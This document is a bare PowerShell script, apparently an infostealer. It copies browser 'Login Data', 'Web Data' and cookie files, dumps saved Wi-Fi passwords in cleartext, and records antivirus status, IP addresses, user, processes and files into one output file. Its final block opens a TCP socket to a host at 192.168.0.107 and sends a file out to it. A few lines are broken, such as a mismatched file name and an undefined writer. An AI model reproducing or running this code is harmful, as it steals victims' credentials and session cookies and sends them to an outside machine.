$var = cat "Login Data"

$var2 = cat "Web Data"


cd Network

Write-Output $var | Out-File -FilePath ./Process6.txt

Write-Output $var2 | Out-File -FilePath ./Process6.txt -Append

Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Cookie' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process6.txt

Start-Sleep -Seconds 2

(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE=$name;PASS=$pass }} | Format-Table -AutoSize | Out-File -FilePath ./Process6.txt -Append

Start-Sleep -Seconds 2

wmiQuery = "SELECT * FROM AntiVirusProduct"
$AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters # -ErrorVariable myError -ErrorAction 'SilentlyContinue'             
            Write-host $AntivirusProduct.displayName | Out-File -FilePath ./Process6.txt -Append

Get-MpComputerStatus | Out-File -FilePath ./Process6.txt -Append

Get-NetIPAddress | Out-File -FilePath ./Process6.txt -Append


whoami | Out-File -FilePath ./Process6.txt -Append

Start-Sleep -Seconds 1.5

ps | Out-File -FilePath ./Process6.txt -Append

Start-Sleep -Seconds 1.5

ls | Out-File -FilePath ./Process6.txt -Append




#start http post 

$test=[io.file]::ReadAllBytes("Process2.txt");
$socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
$stream = $socket.GetStream();
$stream.write($test,0,$test.Length);
$writer.flush();
$socket.close()

